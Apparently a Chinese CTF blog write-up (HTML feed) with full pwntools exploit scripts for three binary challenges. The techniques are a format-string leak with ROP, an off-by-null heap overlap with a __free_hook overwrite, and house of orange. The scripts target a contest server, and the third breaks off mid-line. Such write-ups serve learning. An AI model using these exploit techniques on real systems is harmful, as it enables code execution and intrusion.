    <content type="html"><![CDATA[<h1 id="0x00-ezstack"><a href="#0x00-ezstack" class="headerlink" title="0x00 ezstack"></a>0x00 ezstack</h1><p>格式化字符串泄露carry、libc_start_main、libc_csu_init，从而计算得到libc_base、pie。</p><p>不过libc没用，在本地跑通之后，远程使用LibcSearcher匹配不上，发现程序本调用了system并且还有‘/bin/sh’</p><p>直接加上pie构造ROPl链即可。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;ezstack&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_addr</span>(<span class="params">addr, name, get_addr_name, mode=<span class="number">1</span></span>):</span></span><br><span class="line"><span class="keyword">if</span> mode:</span><br><span class="line"><span class="keyword">return</span> addr-libc.sym[name]+libc.sym[get_addr_name]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> addr-libc.dump(name)+libc.dump(get_addr_name)</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./ezstack&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># nc 47.108.195.119 20113</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.108.195.119&#x27;</span>,<span class="number">20113</span>)</span><br><span class="line">sla(<span class="string">&quot;:\x1b[0m\n&quot;</span>, <span class="string">&#x27;SCA&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;:\x1b[0m\n&quot;</span>, <span class="string">&#x27;Jun&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x00000000000007c1</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000000b03</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%13$p%11$p%12$p&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">240</span></span><br><span class="line">carry = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">_libc_csu_init = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;carry&#x27;</span>, carry)</span><br><span class="line">lg(<span class="string">&#x27;_libc_csu_init&#x27;</span>,_libc_csu_init)</span><br><span class="line">lg(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">pie = _libc_csu_init-<span class="number">0xaa0</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>] + pie</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>] + pie</span><br><span class="line">ret = ret + pie </span><br><span class="line">pop_rdi_ret = pop_rdi_ret + pie</span><br><span class="line">pop_r13_14_15 = <span class="number">0x0000000000000afe</span>+pie</span><br><span class="line">main = pie + <span class="number">0x9dc</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;puts_plt&#x27;</span>,puts_plt)</span><br><span class="line">lg(<span class="string">&#x27;puts_got&#x27;</span>, puts_got)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>+p64(carry)+p64(main))</span><br><span class="line"></span><br><span class="line"><span class="comment"># local</span></span><br><span class="line"><span class="comment"># libc_base = __libc_start_main - libc.sym[&#x27;__libc_start_main&#x27;]</span></span><br><span class="line"><span class="comment"># system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # remote</span></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;__libc_start_main&#x27;, __libc_start_main)</span></span><br><span class="line"><span class="comment"># offset = __libc_start_main - libc.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class="line"><span class="comment"># system = offset + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment"># binsh = offset + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line">system = <span class="number">0x0000000000000A8C</span>+pie</span><br><span class="line">binsh = <span class="number">0x0000000000000B24</span>+pie</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>,binsh)</span><br><span class="line">sl(<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>+p64(carry)+p64(ret)*<span class="number">4</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system))</span><br><span class="line"><span class="comment"># sl(&#x27;a&#x27;*24+p64(carry)+p64(ret)*4+p64(pop_rdi_ret)+p64(binsh)+p64(system))</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x01-noleak"><a href="#0x01-noleak" class="headerlink" title="0x01 noleak"></a>0x01 noleak</h1><p>正常的off by null.</p><p>给的libc中有tacache机制，直接申请大于0x410的块就不会到tacache bin 里面。</p><p>首先申请四个块，最后一个0x20使防止与top chunk合并。dele(0)之后在改chunk2的pre_size为chunk0和chunk1的大小之和。将dele(2)之后，将会把chunk 0 ,1,2 合并成一个块。但是其中chunk1还是我们可控的造成堆块复用。再次申请0x4f8之后， main_arena+88的值将会跑到chunk1中，show(1)得到main_arena+88。</p><p>最后就是计算system之后，修改__free_hook 为system, 再free(3)就是再运行system(‘/bin/sh’)</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># nc 47.108.195.119 20182 </span></span><br><span class="line">p = remote(<span class="string">&#x27;47.108.195.119&#x27;</span>,<span class="number">20182</span>)</span><br><span class="line">sla(<span class="string">&quot;:\x1b[0m\n&quot;</span>, <span class="string">&#x27;SCA&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;:\x1b[0m\n&quot;</span>, <span class="string">&#x27;Jun&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>():</span></span><br><span class="line">sla(<span class="string">&quot;str:&quot;</span> , <span class="string">&quot;N0_py_1n_tHe_ct7&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;?\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&#x27;?\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;?\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;?\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&quot;:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;?\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x4f8</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x1f8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x4f8</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;cat sky_token\x00&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x1f0</span>+p64(<span class="number">0x200</span>+<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x4f8</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena = l64() - <span class="number">96</span></span><br><span class="line"><span class="built_in">print</span>(libc.sym[<span class="string">&#x27;main_arena&#x27;</span>])</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - <span class="number">0x0003AFC40</span></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;main_arena&quot;</span>, main_arena)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">lg(<span class="string">&#x27;free_hook&#x27;</span>, free_hook)</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x20</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">7</span>, p64(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x02-ezheap"><a href="#0x02-ezheap" class="headerlink" title="0x02 ezheap"></a>0x02 ezheap</h1><p>正常的house of orange</p><p>没有free()函数，edit可以修改任意大小。</p><p>将top_chunk的size改小，使其不满足下次申请的大小，top_chunk将会被free到unsorted bin中，从而泄露main_arena。</p><p>house of orange利用条件：</p><ol><li>地址页对齐，即修改的大小值加上当前top_chunk的地址，最后12bits 全为0</li><li>修改的大小必须要大于MINSIZE，即大于0x10</li><li>top_chunk的size的prev_inuse要为1</li><li>之后申请的小要大于修改后的top_chunk的大小。</li></ol><p>此时，<code>0xfb1</code>+<code>0x55d2430ed050</code> = <code>0x55d2430ee000</code> 满足页对齐</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x55e2338f3020</span><br><span class="line">0x55e2338f3020:0x00000000000000000x0000000000000031</span><br><span class="line">0x55e2338f3030:0x0000000000000a610x0000000000000000</span><br><span class="line">0x55e2338f3040:0x00000000000000000x0000000000000000</span><br><span class="line">0x55e2338f3050:0x00000000000000000x0000000000020fb1  ----&gt;top_chunk</span><br><span class="line">0x55e2338f3060:0x00000000000000000x0000000000000000</span><br><span class="line">0x55e2338f3070:0x00000000000000000x0000000000000000</span><br><span class="line">0x55e2338f3080:0x00000000000000000x0000000000000000</span><br><span class="line">0x55e2338f3090:0x00000000000000000x0000000000000000</span><br><span class="line">0x55e2338f30a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55e2338f30b0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>再次申请一个比<code>0xfb1</code>大的块，old_top就会放入<code>unsortedbin</code>中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55fbbdb91050 —▸ 0x7fbe291e6b78 (main_arena+88) ◂— 0x55fbbdb91050</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>再申请一个0x20的块，将从unsortedbin中划分块。数据只填充长度小于8，bk指针会包含main_arena+1640的指针。然后得到libc_base。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x555dc4ba3050 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 49, </span><br><span class="line">  fd = 0xa61616161616161, </span><br><span class="line">  bk = 0x7f6275712188 &lt;main_arena+1640&gt;,     ---&gt;这个值将会输出</span><br><span class="line">  fd_nextsize = 0x555dc4ba3050, </span><br><span class="line">  bk_nextsize = 0x555dc4ba3050</span><br><span class="line">&#125;</span><br><span class="line">0x555dc4ba3080 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 3937, </span><br><span class="line">  fd = 0x7f6275711b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk = 0x7f6275711b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后还要结合IO_FILE来利用，，，还不会，，学完来补充。。。。。。</p><p>_IO_FILE的相关结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   _IO_FILE_plus</span><br><span class="line">  &#123;</span><br><span class="line">_IO_list_all----&gt;_IO_FILE   file1   <span class="comment">//file1-&gt;_chain----&gt;file2-&gt;_chain----&gt;file3........</span></span><br><span class="line"> _IO_jump_t *vtable <span class="comment">//vtable offset表示一些函数指针</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ol><li>计算<code>_IO_list_all</code>地址</li><li>将old_top大小修改为0x60,fb指针为0，bk执指针为<code>_IO_list_all-0x10</code></li><li>接着构造<code>fake__IO_FILE_plus</code> 结构，将<code>vtable</code>的<code>_IO_overflow修改</code>为system地址</li><li>申请一个大于0x60的块，将会执行system。</li></ol><p>方式1：</p><p>绕过<code>mode &lt;= 0 &amp;&amp; fp-&gt;write_ptr &gt; fp-&gt;write_base</code></p><p>方式2：</p><p>绕过<code>mode &gt; 0 &amp;&amp; fp-&gt;_wide_data-&gt;write_ptr &gt; fp-&gt;_wide_data-&gt;write_base</code></p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"> <span class="comment"># nc 47.108.195.119 20141 </span></span><br><span class="line">p = remote(<span 